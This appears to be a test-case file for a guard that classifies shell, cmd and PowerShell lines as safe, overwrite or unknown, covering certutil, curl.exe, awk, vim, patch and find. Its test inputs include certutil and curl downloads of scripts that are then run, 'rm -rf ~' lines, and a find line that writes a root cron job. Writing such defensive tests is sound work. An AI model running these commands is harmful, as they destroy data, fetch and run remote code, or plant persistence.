# Programs that write a file the line names, beyond the redirects, copies and
# cmdlets the other files hold: `curl.exe` and `wget.exe` in PowerShell,
# `certutil`, `Export-Csv` and `Export-Clixml`, `sponge`, `awk -i inplace`,
# `ex` and `vim`, `patch`, and `find -fprint`. Each destination is judged
# where it lands, as any write is: beyond the workspace, a startup or
# protected place is `overwrite`, and inside the workspace it stays safe. The
# format is in CONTRIBUTING.md.

paths protected base=posix file=/home/me/work/repo/conf/app.yaml words="the agent's settings"
paths protected_windows base=windows file=C:\\Users\\me\\dev\\repo\\conf\\app.yaml words="the agent's settings"

# `curl.exe` and `wget.exe` in PowerShell are the programs, not the
# `Invoke-WebRequest` alias a bare `curl` is.
powershell finds=overwrite reason="writes to a system folder" | curl.exe -o C:\\Windows\\x https://x.example/y
powershell finds=overwrite | curl.exe -fsSLo C:\\Windows\\x https://x.example/y
powershell finds=overwrite | curl.exe --output C:\\Windows\\x https://x.example/y
powershell finds=overwrite | curl.exe -o .envrc https://x.example/y
powershell@protected_windows finds=overwrite | curl.exe -o conf\\app.yaml https://x.example/y
powershell finds=overwrite | cd C:\\Windows; curl.exe -O https://x.example/a.dll
powershell finds=overwrite | wget.exe -O C:\\Windows\\x https://x.example/y
powershell finds=overwrite | C:\\Windows\\System32\\curl.exe -o C:\\Windows\\x https://x.example/y
powershell finds=overwrite reason="writes to a file outside the workspace" | curl.exe -o ..\\other\\x https://x.example/y
powershell safe | curl.exe -o out.txt https://x.example/y
powershell safe | curl.exe -O https://x.example/a.txt
powershell safe | wget.exe -O out.txt https://x.example/y
powershell finds=unknown | curl.exe -o i.ps1 https://x.example/i.ps1; .\\i.ps1
powershell finds=overwrite | curl -OutFile C:\\Windows\\x https://x.example/y

# `certutil` downloads a URL to the file after it, and with `-split` and no
# file to the URL's name in the folder the line is in; `-decode`, `-encode`
# and their hex forms write their second file. Its verbs and options take
# `-` or `/`, in any case.
cmd finds=overwrite reason="writes to a system folder" | certutil -urlcache -f https://x.example/y C:\\Windows\\x
cmd finds=overwrite | certutil -urlcache -split -f https://x.example/y C:\\Windows\\x
cmd finds=overwrite | certutil -f -urlcache https://x.example/y C:\\Windows\\x
cmd finds=overwrite | certutil /urlcache /f https://x.example/y C:\\Windows\\x
cmd finds=overwrite | certutil -URLCache -f https://x.example/y C:\\Windows\\x
cmd finds=overwrite | certutil.exe -urlcache -f https://x.example/y .envrc
cmd@protected_windows finds=overwrite | certutil -urlcache -f https://x.example/y conf\\app.yaml
cmd finds=overwrite | cd /d C:\\Windows & certutil -urlcache -split -f https://x.example/a.dll
cmd finds=overwrite | certutil -urlcache -f https://x.example/y %X%
powershell finds=overwrite | certutil -urlcache -f https://x.example/y C:\\Windows\\x
powershell finds=overwrite | certutil.exe -urlcache -split -f https://x.example/y .vscode\\tasks.json
cmd finds=overwrite | certutil -decode a.b64 C:\\Windows\\x
cmd finds=overwrite | certutil -encode a.bin C:\\Windows\\x
cmd finds=overwrite | certutil -f -decodehex a.hex C:\\Windows\\x
cmd finds=overwrite | certutil -encodehex a.bin C:\\Windows\\x 4
powershell finds=overwrite | certutil -decode a.b64 .vscode\\tasks.json
cmd safe | certutil -urlcache -f https://x.example/y out.txt
cmd safe | certutil -urlcache -split -f https://x.example/y
cmd safe | certutil -urlcache -f https://x.example/y
cmd safe | certutil -urlcache * delete
cmd safe | certutil -decode a.b64 out.bin
cmd safe | certutil -encodehex a.bin out.hex 4
powershell safe | certutil -decode a.b64 out.bin
cmd safe | certutil -hashfile a.bin SHA256
# certutil reads a Unicode dash (an en dash, a minus sign) as `-`.
cmd finds=overwrite | certutil –urlcache –f https://x.example/y C:\\Windows\\x
cmd finds=overwrite | certutil −urlcache −split −f https://x.example/y C:\\Windows\\x
powershell finds=overwrite | certutil –urlcache –f https://x.example/y C:\\Windows\\x
cmd safe | certutil –urlcache –f https://x.example/y out.txt

# `Export-Csv` and `Export-Clixml` write the file `-Path`, `-LiteralPath` or
# the first position names; `Export-Csv`'s second position is a delimiter.
powershell finds=overwrite reason="writes to a system folder" | Get-Process | Export-Csv -Path C:\\Windows\\x.csv
powershell finds=overwrite | Get-Process | Export-Csv C:\\Windows\\x.csv
powershell finds=overwrite | Get-Process | epcsv C:\\Windows\\x.csv
powershell finds=overwrite | Get-Process | Export-Csv -LiteralPath C:\\Windows\\x.csv -NoTypeInformation
powershell finds=overwrite | Get-Process | Export-Csv -Pa C:\\Windows\\x.csv
powershell finds=overwrite | Get-Process | Export-Csv -Path .envrc
powershell@protected_windows finds=overwrite | Get-Process | Export-Csv conf\\app.yaml
powershell finds=overwrite | Get-Process | Export-Clixml -Path C:\\Windows\\x.xml
powershell finds=overwrite | Export-Clixml -InputObject $x -LiteralPath C:\\Windows\\x.xml
powershell finds=overwrite | Get-Process | Export-Clixml C:\\Windows\\x.xml -Depth 3
powershell finds=overwrite | Get-Process | Export-Clixml .envrc
powershell finds=overwrite | Get-Process | Export-Csv $f
powershell finds=overwrite | Get-Process | ConvertTo-Json | Set-Content C:\\Windows\\x.json
powershell finds=overwrite | Get-Process | Out-File C:\\Windows\\x.txt
powershell safe | Get-Process | Export-Csv out.csv
powershell safe | Get-Process | Export-Csv out.csv ';'
powershell safe | Get-Process | Export-Csv -Path out.csv -Delimiter ';' -NoTypeInformation
powershell safe | Get-Process | Export-Clixml -Path out.xml
powershell safe | Export-Clixml -InputObject $x out.xml
powershell safe | Get-Process | ConvertTo-Json | Set-Content x.json

# `sponge` writes the file it is given once its input is read.
posix finds=overwrite reason="writes to a system folder" | sort a | sponge /etc/x
posix finds=overwrite | sort a | sponge -a /etc/x
posix finds=overwrite | sort a | sponge ~/.bashrc
posix finds=overwrite | sort a | sponge .envrc
posix@protected finds=overwrite | sort a | sponge conf/app.yaml
posix finds=overwrite | sort a | sponge "$F"
posix finds=overwrite reason="writes to a file outside the workspace" | sort a | sponge ../other/x
posix safe | sort a | sponge a
posix safe | sort a | sponge -a src/a.txt
posix safe | sort a | sponge

# gawk's `inplace` library edits each file awk reads; any other library is
# code the guard does not read.
posix finds=overwrite reason="edits a system folder" | awk -i inplace '{print}' /etc/x
posix finds=overwrite | gawk -i inplace 1 /etc/x
posix finds=overwrite | awk -iinplace 1 /etc/x
posix finds=overwrite | awk --include inplace 1 /etc/x
posix finds=overwrite | awk --include=inplace 1 /etc/x
posix finds=overwrite | awk -i inplace.awk 1 /etc/x
posix finds=overwrite | awk -i inplace -v x=1 1 /etc/x
posix finds=overwrite | awk -i inplace -e 1 /etc/x
posix finds=overwrite | awk -i inplace 1 a /etc/x
posix finds=overwrite | awk -i inplace 1 x=1 /etc/x
posix finds=overwrite | awk -i inplace 1 -- /etc/x
posix finds=overwrite | awk -i inplace 1 ~/.bashrc
posix finds=overwrite | awk -i inplace 1 .envrc
posix@protected finds=overwrite | awk -i inplace 1 conf/app.yaml
posix finds=overwrite | awk '@include "inplace"; 1' /etc/x
posix finds=overwrite,unknown | awk -i inplace -f s.awk /etc/x
posix finds=overwrite,unknown | awk -i "$L" 1 /etc/x
posix finds=unknown | awk -i lib 1 a
posix finds=unknown | awk '@include "lib"; 1' a
# gawk's `-l`/`--load` and `@load` load a shared library, native code the
# guard does not read, whatever its name.
posix finds=unknown reason="loads an awk extension the guard does not read" | awk -l ./ext.so '{print}' x
posix finds=unknown | awk '@load "ext"; {print}' f
posix finds=unknown | gawk -l ext 1 a
posix finds=unknown | awk -lext 1 a
posix finds=unknown | awk --load ext 1 a
posix finds=unknown | awk --load=ext 1 a
posix finds=unknown | awk --loa ext 1 a
posix finds=unknown | awk -bl ext 1 a
posix finds=unknown | awk -W load ext 1 a
posix finds=unknown | awk -Wload=ext 1 a
posix finds=unknown | awk -l "$L" 1 a
posix finds=unknown | awk -l inplace 1 a
posix finds=unknown | awk -l
posix finds=unknown | awk '@load"ext"; 1' a
posix finds=unknown | awk -e '@load "ext"' -e 1 a
posix finds=unknown | awk -i inplace '@load "ext"; 1' a
posix finds=overwrite,unknown | awk -i inplace -l ext 1 /etc/x
posix finds=unknown | awk '@include "file.awk"; 1' a
# gawk reads `@` as a token of its own, and `load` or `include` after it,
# past spaces, tabs, carriage returns and backslash-newlines, as the
# directive; `@loader` is no directive.
posix finds=unknown reason="loads an awk extension the guard does not read" | awk '@ load "ext"; {print}' f
posix finds=unknown | awk '@\tload "ext"; 1' a
posix finds=unknown | awk '@\\\nload "ext"; 1' a
posix finds=unknown | awk '@\r\\\r\nload "ext"; 1' a
posix finds=unknown | awk '@ include "lib"; {print}' f
posix finds=unknown | awk '@\tinclude "lib"; 1' a
posix finds=unknown | awk '@\\\ninclude "lib"; 1' a
posix finds=unknown | awk '@include\\\n"lib"; 1' a
posix safe | awk -i inplace '@ include "inplace"; 1' a
posix safe | awk '@\\\ninclude\t"inplace"; 1' a
posix safe | awk '/@loader/ {print}' f
posix safe | awk '{print "@includes"}' f
powershell finds=unknown reason="loads an awk extension the guard does not read" | awk '@ load "ext"; 1' a
cmd finds=unknown reason="runs an awk script the guard does not read" | awk "@ include \\"lib\\"; 1" a
posix finds=unknown | awk --include file.awk 1 a
posix safe | awk -i inplace '{print}' f
posix safe | awk '{print}' f
posix safe | awk '{print "load"}' f
posix safe | awk -i inplace 1 src/a.txt
posix safe | awk -i inplace '{sub(/a/, "b")} 1' a b
posix safe | awk -i inplace 1 x=1 a
posix safe | awk -i inplace 1
posix safe | awk '{print}' /etc/hosts
# gawk reads its options as getopt_long does: a bundle one letter at a time,
# a letter that takes a value taking the rest of the bundle or the next word,
# a long option by a prefix only one name starts with, `-W name` as `--name`.
posix finds=overwrite | awk --in inplace 1 /etc/x
posix finds=overwrite | awk --incl=inplace 1 /etc/x
posix finds=overwrite | awk -bi inplace 1 /etc/x
posix finds=overwrite | awk -Oiinplace 1 /etc/x
posix finds=overwrite | awk -Pi inplace 1 /etc/x
posix finds=overwrite | awk -W include inplace 1 /etc/x
posix finds=overwrite | awk -Winclude=inplace 1 /etc/x
posix finds=unknown | awk --fil s.awk /etc/x
posix finds=unknown | awk -bf s.awk /etc/x
posix finds=unknown | awk -E s.awk /etc/x
posix finds=unknown | awk --ex=s.awk a
posix finds=unknown | awk -W "$O" 1 a
# A prefix more than one name starts with is an option the guard cannot tell.
posix finds=unknown | awk --p 1 a
posix finds=unknown | awk --f=s.awk a
# `-o`, `-p` and `-d` write the file joined to them, and only that.
posix finds=overwrite reason="writes to a system folder" | awk -o/etc/x 1 a
posix finds=overwrite | awk --profile=/etc/x 1 a
posix finds=overwrite | awk --dump-variables=.envrc 1 a
posix safe | awk -o 1 a
posix safe | awk -p 1 a
posix safe | awk -F, '{print $1}' a.csv
posix safe | awk -bF: '{print $1}' a
posix safe | awk -vx=1 -v y=2 '{print x}' a
posix safe | awk --assign=x=1 --field-sep=, 1 a
posix safe | awk --lint 1 a

# `ex` and `vim` edit each file they are given, and write a file an ex
# command names. A command the guard does not read (`!`, `call`, `source`)
# is code it does not read, as a script `-S` sources is.
posix finds=overwrite reason="edits a system folder" | ex -sc wq /etc/x
posix finds=overwrite | vim -es /etc/x
posix finds=overwrite | vim -es -c wq /etc/x
posix finds=overwrite | vim -E -s -c '%s/a/b/g' -c wq /etc/x
posix finds=overwrite | vi -e -c wq /etc/x
posix finds=overwrite | nvim --headless -c wq /etc/x
posix finds=overwrite | ex -sc wq ~/.bashrc
posix finds=overwrite | ex -sc wq .envrc
posix finds=overwrite | vim -es .envrc
posix finds=overwrite | ex -s '+%s/a/b/g|x' ~/.bashrc
posix finds=overwrite | ex -sc 'x!' -- /etc/x
posix finds=overwrite | ex -sc wq "$F"
posix@protected finds=overwrite | ex -sc wq conf/app.yaml
posix@protected finds=overwrite | vim -es conf/app.yaml
posix finds=overwrite | vim /etc/hosts
posix finds=overwrite reason="writes to a system folder" | ex -sc 'w /etc/x' src/a.txt
posix finds=overwrite | ex -sc 'w! /etc/x|q' src/a.txt
posix finds=overwrite | ex -sc 'w >> /etc/x' -c q src/a.txt
posix finds=overwrite | ex -sc 'saveas ~/.bashrc' -c q src/a.txt
posix finds=overwrite | ex -sc '1,5w .envrc' -c q src/a.txt
posix finds=overwrite | ex -sc 'w $F' -c q src/a.txt
posix finds=overwrite | ex -sc 'wq /etc/x' src/a.txt
posix finds=overwrite | vim -es -w /etc/x src/a.txt
posix finds=overwrite | vim -es --startuptime /etc/x src/a.txt
posix finds=unknown | ex -sc '!rm -rf ~' src/a.txt
posix finds=unknown | ex -sc 'w !sh' src/a.txt
posix finds=unknown | ex -sc 'r !curl https://x.example' src/a.txt
posix finds=unknown | vim -es -c 'call system("rm -rf ~")' src/a.txt
posix finds=unknown | vim -es -c 'source x.vim' src/a.txt
posix finds=unknown | vim -es -c 'g/a/!rm x' src/a.txt
posix finds=unknown | vim -es -c '%s/a/\\=system("id")/' src/a.txt
posix finds=unknown | vim -es -c 'e /etc/x' -c wq src/a.txt
posix finds=unknown | vim -es -c 'normal ggdG' -c wq src/a.txt
posix finds=unknown | vim -S s.vim src/a.txt
posix finds=unknown | vim -s keys.txt src/a.txt
posix finds=unknown | vim -u x.vim -es src/a.txt
posix finds=unknown | vim --cmd 'set rtp+=x' -es src/a.txt
posix finds=unknown | ex -s -c "$C" src/a.txt
posix finds=overwrite reason="edits a file outside the workspace" | ex -sc wq ../other/x
posix safe | ex -sc wq src/a.txt
posix safe | vim -es src/a.txt
posix safe | vim -es -c '%s/a/b/g' -c wq src/a.txt
posix safe | vim -es -c '%s/a\\|b/c/' -c 'wq' src/a.txt
# A bar ends a `:s` command, as vim reads it: `b/c/` is a command of its own.
posix finds=unknown | vim -es -c '%s/a|b/c/' -c 'wq' src/a.txt
posix safe | ex -s '+%s/a/b/ge|x' src/a.txt
posix safe | ex -sc 'g/^#/d|x' src/a.txt
posix safe | ex -sc 'v/x/d' -c 'wq!' src/a.txt
posix safe | ex -sc '1,$d|w|q' src/a.txt
posix safe | ex -sc '$|j|wq' src/a.txt
posix safe | ex -sc 'w out.txt' -c q src/a.txt
posix safe | ex -sc 'sort|wq' src/a.txt
posix safe | ex -sc 'qa!' src/a.txt
posix safe | vim -u NONE -es -c wq src/a.txt
posix safe | vim -i NONE -es -c wq src/a.txt
posix safe | vim +10 src/a.txt
posix safe | vim -es -- src/a.txt
posix safe | vim -d a b
posix safe | vim
# vim under the other names it is installed as.
posix finds=overwrite | vim.tiny -es /etc/x
posix finds=overwrite | vim.basic -es -c wq /etc/x
posix finds=overwrite | rvim -es /etc/x
posix finds=overwrite | vimx -es /etc/x
posix finds=overwrite | evim /etc/x
posix safe | vim.tiny -es src/a.txt
# A file opened read-only (`-R`, `-M`, `view`) is written only by a command
# that writes it.
posix safe | view /etc/hosts
posix safe | vim -R /etc/hosts
posix safe | vim -M /etc/hosts
posix safe | rview /etc/hosts
posix safe | gview /etc/hosts
posix finds=overwrite | vim -R -es -c 'wq!' /etc/x
posix finds=overwrite reason="writes to a system folder" | view -es -c 'w /etc/x' src/a.txt
# `%` is the one file the editor edits.
posix safe | ex -sc 'w %.bak' -c q src/a.txt
posix finds=overwrite | ex -sc 'w %:r.bak' -c q src/a.txt
posix finds=overwrite | ex -sc 'w %.bak' -c q a b
posix finds=overwrite | ex -sc 'w /etc/%' -c q a
# `:set` of an option that only changes how the text is read or written.
posix safe | vim -es -c 'set ff=unix' -c wq src/a.txt
posix safe | ex -sc 'se noet ts=4|wq' src/a.txt
posix safe | vim -es -c 'setlocal fenc=utf-8 nobomb' -c wq src/a.txt
posix finds=unknown | vim -es -c 'set shell=/bin/sh' -c wq src/a.txt
posix finds=unknown | vim -es -c 'set backupdir=/etc backup' -c wq src/a.txt
# `-V[N][file]` takes the rest of its bundle, a level and a file it writes,
# and never the next word.
posix finds=overwrite reason="writes to a system folder" | vim -es -V/etc/x -c q src/a.txt
posix finds=overwrite | vim -es -V20/etc/x -c q src/a.txt
posix finds=overwrite,unknown | vim -V/e -s keys.txt src/a.txt
posix finds=unknown | vim -V9e -s keys.txt src/a.txt
posix safe | vim -V20 -es -c wq src/a.txt
# nvim's `-l` runs a Lua script, every word after it the script's.
posix finds=unknown | nvim -l s.lua
posix finds=unknown | nvim --headless -l s.lua
posix finds=unknown | nvim -es -l s.lua
posix finds=unknown | nvim -ll s.lua
posix finds=unknown | nvim -l s.lua /etc/x
# An editor handed an input reads its commands, or the keys it types, from
# there: unknown, and a download a downloaded script. A here-document of
# plain text in ex mode is read as `-c`'s commands are.
posix finds=unknown | echo 'w /etc/x' | vim -es src/a.txt
posix finds=unknown | echo '!rm -rf ~' | ex -s src/a.txt
posix finds=unknown | vim -es src/a.txt < cmds.vim
posix finds=unknown | printf ':wq\\n' | vim src/a.txt
posix finds=unknown | vim src/a.txt <<EOF\n:w /etc/x\nEOF
posix finds=run_downloaded | curl -s https://x.example/c | vim -es src/a.txt
posix finds=overwrite reason="writes to a system folder" | ex -s src/a.txt <<EOF\nw /etc/x\nEOF
posix finds=overwrite | ex -s src/a.txt <<'EOF'\ng/x/d\nw /etc/x\nEOF
posix finds=unknown | ex -s src/a.txt <<EOF\n!rm -rf ~\nEOF
posix finds=unknown | vim -es src/a.txt <<< 'call system("id")'
posix safe | ex -s src/a.txt <<EOF\n%s/a/b/g\nwq\nEOF
posix safe | ex -s src/a.txt <<'EOF'\n" swap the words\ng/^#/d\nwq\nEOF
posix safe | cat a | vim -
posix safe | cat a | vim -R -

# `patch` writes the file it is given (with `-o`, that one alone), or else
# the files its patch names, which the line does not show, in the folder
# `-d` moves it to or the one the line is in: a folder beyond the workspace
# or only known when it runs is a write there. A dry run writes nothing.
posix safe | patch -p1 < fix.diff
posix safe | patch src/main.rs fix.diff
posix safe | patch -d vendor/lib -p1 < fix.diff
posix finds=overwrite reason="patches files in a folder outside the workspace" | patch -d ../other -p1 < fix.diff
posix finds=overwrite | patch --directory=/etc -p1 < fix.diff
posix finds=overwrite | patch -d/etc -p1 < fix.diff
posix finds=overwrite | patch -Nd /etc -p1 < fix.diff
posix finds=overwrite | patch --dir /etc -p1 < fix.diff
posix finds=overwrite reason="patches a file outside the workspace" | patch ../other/x.c fix.diff
posix finds=overwrite | patch -d /etc hosts fix.diff
posix finds=overwrite reason="writes to a file outside the workspace" | patch -o ../other/a.c src/a.c fix.diff
posix finds=overwrite | patch .envrc fix.diff
posix finds=overwrite | patch -p1 $OPTS < fix.diff
posix finds=overwrite | cd /etc && patch -p1 < fix.diff
posix@protected finds=overwrite | patch conf/app.yaml fix.diff
posix@protected finds=overwrite | patch -d conf -p1 < fix.diff
posix safe | patch -o - src/a.c fix.diff
posix safe | patch --dry-run -d /etc -p1 < fix.diff
posix safe | patch --dry -d /etc -p1 < fix.diff
posix safe | patch -C -d /etc -p1 < fix.diff
posix safe | patch -p1 -i fix.diff
# git applies a patch in the folder it works in.
posix finds=overwrite reason="patches files in a folder outside the workspace" | git -C ../other apply fix.diff
posix finds=overwrite | git -C /etc am
posix finds=overwrite | git --work-tree=$W apply fix.diff
posix safe | git apply fix.diff

# `find -fprint FILE`, `-fprint0 FILE` and `-fls FILE` write the list they
# make to the file, and `-fprintf FILE FORMAT` writes any text the format
# holds: each file is judged as a redirect's is. A test's value and the
# words an `-exec` runs are not a file it writes.
posix finds=overwrite reason="writes to a system folder" | find . -fprintf /etc/cron.d/x '* * * * * root sh\\n'
posix finds=overwrite reason="writes to a shell startup file" | find . -fprint /home/me/.bashrc
posix finds=overwrite | find . -fprint0 /etc/x
posix finds=overwrite | find . -fls ~/.bashrc
posix finds=overwrite | find ~ -name x -fprint /etc/x
posix finds=overwrite | find . -type f -fprint .envrc
posix@protected finds=overwrite | find . -fprint conf/app.yaml
posix finds=overwrite reason="writes to a file outside the workspace" | find . -fprint ../other/list.txt
posix safe | find . -fprint list.txt
posix safe | find . -fprintf list.txt '%p\\n'
posix safe | find . -name -fprint -print
posix safe | find . -exec echo -fprint /etc/x \\;
